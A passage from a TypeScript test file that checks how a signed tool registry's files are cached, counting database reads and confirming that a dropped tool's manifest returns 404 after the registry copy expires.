                if (sql === "SELECT url, body FROM tool_registry_files WHERE registry_id=?") reads++;
                return t.prepare(sql);
              }
            : Reflect.get(t, k, t),
      }),
    } as Env;
    vi.useFakeTimers({ toFake: ["Date"] });
    const t0 = Date.now();
    for (const u of [REG, manifest, script]) expect((await file(counted, id, u)).status).toBe(200);
    const before = reads;
    for (let i = 0; i < 5; i++) {
      expect((await file(counted, id, manifest)).status).toBe(200);
      expect((await file(counted, id, script)).status).toBe(200);
    }
    expect(reads).toBe(before); // fresh copies, the registry's leads from the cache

    // the registry drops the tool: once its copy is refreshed, the manifest is no longer carried
    const kept = files[REG]!;
    files[REG] = await signedRegistry([]);
    try {
      vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 1) * 1000);
      expect((await file(counted, id, REG)).copy).toBe("fresh");
      expect((await file(counted, id, manifest)).status).toBe(404);
      expect(net.hits.filter((u) => u === manifest)).toHaveLength(1);
    } finally {
      files[REG] = kept;
    }
  });
});
